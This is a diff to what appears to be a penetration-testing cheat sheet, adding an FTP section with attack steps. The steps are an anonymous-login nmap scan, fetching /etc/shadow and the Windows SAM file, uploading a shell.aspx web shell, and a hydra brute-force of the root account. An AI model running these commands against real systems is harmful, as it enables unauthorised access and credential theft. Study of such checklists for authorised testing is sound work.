@@ -64,7 +64,18 @@ XXE
 File Upload Vulnerabilities
 SSL Digger
 ====================[Services]=================
-FTP - Anonymous Login
+1 ===[21 -FTP]===
+Enumeration:
+= Anonymous login:
+== nmap --script ftp-anon -p21 $ip
+Exploitation:
+= Connect and try to download/upload files (even if you can't cd into that directory):
+= get /etc/shadow
+= get C:\\Windows\\system3\\config\\SAM
+= put shell.aspx
+= Brute-force:
+== hydra -l root -P /usr/share/wordlists/rockyou.txt $ip ftp -t 1
+
 FTP - read/write
 MSSQL with weak credentials
 MYSQL with Weak Credntials
